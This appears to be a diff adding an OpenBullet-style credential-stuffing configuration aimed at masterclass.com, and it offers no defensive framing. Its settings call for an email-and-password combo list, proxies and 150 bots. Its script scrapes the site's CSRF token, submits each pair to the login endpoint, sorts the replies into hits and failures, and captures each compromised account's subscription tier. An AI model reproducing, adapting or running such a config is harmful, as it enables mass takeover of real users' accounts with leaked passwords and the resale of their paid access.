@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "masterclass.com",
+  "SuggestedBots": 150,
+  "LastModified": "2018-06-26T21:37:22.1916257+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.masterclass.com/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "\"csrf-token\" content=\"" "\"" Recursive=FALSE -> VAR "CSRF" "" "" 
+#LOGIN_(POST) REQUEST POST "https://www.masterclass.com/auth/identity/callback" AutoRedirect=TRUE 
+  CONTENT "auth_key=<USER>&password=<PASS>&provider=identity" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.masterclass.com/" 
+  HEADER "origin: https://www.masterclass.com" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "x-newrelic-id: XQ4GVlBRGwsDV1FUDgI=" 
+  HEADER "x-csrf-token: <CSRF>" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "status\":\"failed\"" 
+  KEYCHAIN Success OR 
+    KEY "status\":\"success\"" 
+REQUEST GET "https://www.masterclass.com/account/edit" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "Subscription</h4><h2 class=\"rounded-box__header\">" "<" Recursive=FALSE -> CAP "SUBSCRIPTION" "" "" 
